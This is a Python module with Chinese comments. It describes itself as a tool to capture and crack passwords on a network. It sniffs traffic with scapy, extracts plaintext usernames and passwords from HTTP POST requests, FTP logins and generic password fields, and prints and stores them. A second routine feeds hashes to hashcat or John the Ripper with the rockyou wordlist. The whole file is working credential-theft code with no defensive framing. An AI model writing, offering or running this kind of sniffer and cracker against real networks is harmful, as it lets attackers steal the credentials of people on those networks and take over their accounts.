#!/usr/bin/env python3
"""
密码捕获和破解模块
捕获网络中的密码哈希，并使用工具进行破解
"""

import subprocess
import hashlib
import re
from scapy.all import sniff, IP, TCP, Raw
import threading
import time

class PasswordCapture:
    def __init__(self):
        """初始化密码捕获器"""
        self.capturing = False
        self.captured_passwords = []
        self.captured_hashes = []
        self.capture_thread = None
    
    def _capture_packets(self, interface=None):
        """捕获数据包并提取密码"""
        def process_packet(packet):
            if packet.haslayer(Raw):
                try:
                    load = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # 检测HTTP POST请求中的密码
                    if 'POST' in load and 'password' in load.lower():
                        self._extract_http_credentials(load)
                    
                    # 检测FTP密码
                    if 'USER' in load or 'PASS' in load:
                        self._extract_ftp_credentials(load)
                    
                    # 检测其他协议的凭据
                    self._extract_generic_credentials(load)
                except:
                    pass
        
        sniff(iface=interface, prn=process_packet, stop_filter=lambda x: not self.capturing)
    
    def _extract_http_credentials(self, data):
        """从HTTP数据中提取凭据"""
        username_match = re.search(r'(?:user|username|email|login|userid)=([^&\s]+)', data, re.IGNORECASE)
        password_match = re.search(r'password=([^&\s]+)', data, re.IGNORECASE)
        
        if username_match or password_match:
            username = username_match.group(1) if username_match else "N/A"
            password = password_match.group(1) if password_match else "N/A"
            
            credential = {
                'type': 'HTTP',
                'username': username,
                'password': password,
                'timestamp': time.time()
            }
            
            self.captured_passwords.append(credential)
            print(f"[+] 捕获HTTP凭据: {username} / {password}")
    
    def _extract_ftp_credentials(self, data):
        """从FTP数据中提取凭据"""
        if 'USER' in data:
            username = data.split('USER')[1].split('\r\n')[0].strip()
            credential = {'type': 'FTP', 'username': username, 'password': None, 'timestamp': time.time()}
            self.captured_passwords.append(credential)
        
        if 'PASS' in data:
            password = data.split('PASS')[1].split('\r\n')[0].strip()
            if self.captured_passwords and self.captured_passwords[-1]['type'] == 'FTP':
                self.captured_passwords[-1]['password'] = password
                print(f"[+] 捕获FTP凭据: {self.captured_passwords[-1]['username']} / {password}")
    
    def _extract_generic_credentials(self, data):
        """提取通用格式的凭据"""
        # 检测各种常见的凭据格式
        patterns = [
            r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
            r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
            r'pass["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
        ]
        
        for pattern in patterns:
            matches = re.finditer(pattern, data, re.IGNORECASE)
            for match in matches:
                password = match.group(1)
                if len(password) > 3:  # 过滤太短的匹配
                    credential = {
                        'type': 'Generic',
                        'username': 'N/A',
                        'password': password,
                        'timestamp': time.time()
                    }
                    self.captured_passwords.append(credential)
    
    def start(self, interface=None):
        """开始捕获密码"""
        if self.capturing:
            return False
        
        self.capturing = True
        self.capture_thread = threading.Thread(target=self._capture_packets, args=(interface,), daemon=True)
        self.capture_thread.start()
        print("[+] 密码捕获已启动")
        return True
    
    def stop(self):
        """停止捕获密码"""
        self.capturing = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
        print("[+] 密码捕获已停止")
        return True
    
    def get_captured_passwords(self):
        """获取捕获的密码"""
        return self.captured_passwords
    
    def crack_hash(self, hash_value, hash_type='md5', wordlist='/usr/share/wordlists/rockyou.txt'):
        """
        使用hashcat或John the Ripper破解哈希
        
        Args:
            hash_value: 要破解的哈希值
            hash_type: 哈希类型 (md5, sha1, sha256, etc.)
            wordlist: 字典文件路径
        """
        print(f"[*] 尝试破解哈希: {hash_value} (类型: {hash_type})")
        
        # 尝试使用hashcat
        try:
            hashcat_cmd = [
                'hashcat',
                '-m', self._get_hashcat_mode(hash_type),
                hash_value,
                wordlist,
                '--force'  # 在某些系统上可能需要
            ]
            
            result = subprocess.run(hashcat_cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                # 解析hashcat输出
                for line in result.stdout.split('\n'):
                    if hash_value in line and ':' in line:
                        cracked = line.split(':')[-1]
                        print(f"[+] 破解成功: {cracked}")
                        return cracked
        except Exception as e:
            print(f"Hashcat错误: {e}")
        
        # 尝试使用John the Ripper
        try:
            # 创建临时文件
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.hash') as f:
                f.write(f"{hash_value}\n")
                temp_file = f.name
            
            john_cmd = ['john', '--wordlist=' + wordlist, temp_file]
            result = subprocess.run(john_cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0 or 'password' in result.stdout.lower():
                # 尝试显示破解结果
                show_cmd = ['john', '--show', temp_file]
                show_result = subprocess.run(show_cmd, capture_output=True, text=True)
                if show_result.returncode == 0:
                    print(f"[+] 破解结果: {show_result.stdout}")
            
            import os
            os.unlink(temp_file)
        except Exception as e:
            print(f"John the Ripper错误: {e}")
        
        return None
    
    def _get_hashcat_mode(self, hash_type):
        """获取hashcat模式代码"""
        modes = {
            'md5': '0',
            'sha1': '100',
            'sha256': '1400',
            'sha512': '1700',
            'ntlm': '1000',
            'bcrypt': '3200'
        }
        return modes.get(hash_type.lower(), '0')

